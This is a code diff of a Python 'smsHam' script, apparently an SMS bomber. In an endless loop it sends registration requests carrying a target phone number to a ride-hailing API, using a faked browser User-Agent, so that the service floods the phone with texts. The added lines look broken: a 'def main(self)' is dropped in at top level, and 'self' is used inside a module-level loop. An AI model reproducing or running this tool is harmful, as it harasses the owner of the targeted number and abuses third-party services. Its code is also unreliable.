@@ -1,5 +1,6 @@
 import requests, random, datetime, sys, time, argparse, os
-
+def main(self):
+	os.system("clear")
 banner = """
                      smsHam
                smsHam       smsHam
@@ -34,6 +35,7 @@ _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
 iteration = 0
 print(' ')
 while True:
+	self.formatted_phone = _phone
 	_email = _name+f'{iteration}'+'@gmail.com'
 	email = _name+f'{iteration}'+'@gmail.com'
 	requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
